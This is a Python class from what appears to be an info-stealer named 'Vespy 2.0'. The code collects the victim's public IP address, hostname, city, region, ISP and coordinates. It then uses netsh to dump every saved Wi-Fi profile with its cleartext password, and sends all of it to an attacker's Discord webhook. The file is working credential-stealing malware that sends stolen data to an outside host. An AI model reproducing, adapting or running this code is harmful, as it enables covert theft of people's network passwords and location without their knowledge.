class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        self.city = f"``{con['city']}``"
        self.region = f"``{con['region']}``"
        self.country = f"``{con['country']}``"
        self.location = f"``{con['loc']}``"
        self.ISP = f"``{con['org']}``"
        self.postal = f"``{con['postal']}``"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``")
                webhook.add_embed(embed)
                webhook.execute()
        except:pass
